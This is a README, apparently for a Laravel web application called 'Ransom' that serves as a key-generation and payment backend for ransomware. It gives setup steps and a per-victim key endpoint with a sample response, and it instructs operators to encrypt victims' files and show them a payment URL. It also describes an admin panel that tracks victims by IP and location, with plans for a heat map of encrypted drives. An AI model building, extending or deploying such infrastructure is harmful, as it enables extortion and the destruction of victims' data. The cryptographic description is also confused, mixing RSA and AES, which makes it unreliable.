<p class="center"><img src="https://i.imgur.com/zShH9AO.png"></p>

# About Ransom

Ransom is a key generator for your ransomware software. We generate RSA keys via your identifier, and then send it back to your program. 


#Installing

To install, open the .env file and edit the following lines:

    DB_CONNECTION=mysql
    DB_HOST=127.0.0.1
    DB_PORT=3306
    DB_DATABASE=ransom
    DB_USERNAME=root
    DB_PASSWORD=

Those values must corespond with your database information. Now run the following command:

    php artisan migrate
    
That command will create all of the tables for you.


#Generating keys

When we generate keys, we get the identifier you send the system and AES encrypt it, and send back the encryption key, and the payment url, for example: Visit http://mysite.com/rsa/(identifier) replace the `(identifier)` with the id you generated for the compromised computer, and you will get the following json response back:

    {"rsa":"eyJpdiI6IjBXXC9ocXc4YUhrb3ArWGpadzR1b3NBPT0iLCJ2YWx1ZSI6IjhUaEl1NmM1aUFUSVoxdk13cGpWcWc9PSIsIm1hYyI6IjhmNTY3NTQ4ZjcyZGQ5MmU1NDI1ZTQ0ZDYyNTA3OGY4ZWYxODkwZjhkNzE5ODEwZWIzYTE2MDBmMjg0M2I1NmEifQ==","url":"http:\/\/mysite.com\/payment\/pay\/34543"}
    
    
You can then encrypt their files with the rsa key, and display the payment URL to them. 


#Updates

At the moment, we do not accept payments, it's been a while since using Bitcoin, and all API's require verification, I may use an RPC client, but that will require a VPS to run the bitcoin daemon on. 

We plan on seperating the systems, too. God forbid, the site was comprimised, your keys would be on the same site as the payments, so we plan on having the payment gateway and the key generator seperate.


#Backened

We have a register and login system, so you can register an account (an admin account) and then disable the registeration so no one else can register. To register visit:

     http://mysite.com/auth/sign-up
     
You will then be redirectred to the admin panel, where you can view the Keys, when they were created and in what country/state and by what IP.

To login, simply visit

    http://mysite.com/auth/sign-in
 
With the details you created on the register page.



#Plans

- Heat map in the admin panel to see what country/region/state has the moest encrypted harddrives.
- Manually accept a payment in the admin panel, so click the paid for button and their key will be released

